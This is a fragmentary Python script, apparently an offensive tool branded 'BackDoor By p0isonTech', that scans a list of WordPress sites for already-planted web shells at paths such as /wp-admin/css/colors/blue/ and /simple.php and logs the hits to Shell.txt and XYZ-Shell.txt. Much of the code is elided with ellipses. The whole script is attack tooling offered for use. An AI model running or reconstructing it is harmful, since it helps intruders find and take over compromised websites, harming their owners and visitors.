...
banner = '''{}
		          ...
		          BackDoor By p0isonTech
		[*] Twitter: https://twitter.com/p0isontech
		[*] TikTok:  https://www.tiktok.com/@p0isontech
                     $ Modo de Uso no Arquivo --> HelpDoor.txt 
...
try:
    ...
    exit('\n  [!] Insira --> [' + path[len(path) - 1] + '] [sites.txt]')
    ...
    def ba_blue(self, site):
        try:
            ...
            if 'Black Bot' in response:
                ...
                open('Shell.txt', 'a').write(url + "/wp-admin/css/colors/blue/" + filename + "\n")
            else:
...
def multiblackbot(url):
    try:
        ...
        if '{XYZ-Shell}' in check.content.decode():
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('XYZ-Shell.txt', 'a').write(url + '/simple.php\n')
        else:
